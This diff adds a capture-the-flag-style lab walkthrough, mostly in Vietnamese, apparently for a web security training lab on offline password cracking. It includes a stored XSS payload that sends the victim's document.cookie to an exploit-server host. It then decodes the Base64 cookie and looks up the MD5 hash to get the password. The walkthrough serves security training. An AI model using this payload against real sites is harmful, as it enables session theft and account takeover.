@@ -1,0 +1,23 @@
+AUTHENTICATION: Offline password cracking
+
+ENDGOAL: To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page
+
+ANALYSTIC
+---------
+Khi Burp đang chạy, hãy sử dụng tài khoản của bạn để tìm hiểu chức năng "Duy trì trạng thái đăng nhập". Lưu ý rằng stay-logged-incookie được mã hóa theo chuẩn Base64.
+Trong tab Proxy > Lịch sử HTTP , hãy đi tới Phản hồi cho yêu cầu đăng nhập của bạn và đánh dấu stay-logged-incookie để xem nó được xây dựng như sau:
+
+username+':'+md5HashOfPassword
+Bây giờ bạn cần đánh cắp cookie của người dùng nạn nhân. Lưu ý rằng chức năng bình luận dễ bị tấn công XSS.
+Truy cập máy chủ khai thác và ghi lại URL.
+Truy cập một trong các blog và đăng bình luận có chứa mã XSS đã lưu trữ sau đây, nhớ nhập ID máy chủ khai thác của riêng bạn:
+
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+Trên máy chủ khai thác, hãy mở nhật ký truy cập. Sẽ có một GETyêu cầu từ nạn nhân có chứa stay-logged-incookie của họ.
+Giải mã cookie trong Burp Decoder. Kết quả sẽ là:
+
+carlos:26323c16d5f4dabff3bb136f2460a943
+Sao chép mã băm và dán vào công cụ tìm kiếm. Điều này sẽ tiết lộ mật khẩu là onceuponatime.
+Đăng nhập vào tài khoản của nạn nhân, vào trang "Tài khoản của tôi" và xóa tài khoản của họ để giải quyết phòng thí nghiệm.
+Ghi chú
+Mục đích của phòng thí nghiệm này là để chứng minh tiềm năng bẻ khóa mật khẩu ngoại tuyến. Nhiều khả năng, điều này sẽ được thực hiện bằng cách sử dụng một công cụ như hashcat chẳng hạn. Khi kiểm tra trang web của khách hàng, chúng tôi không khuyên bạn nên gửi băm mật khẩu thực của họ trong công cụ tìm kiếm.
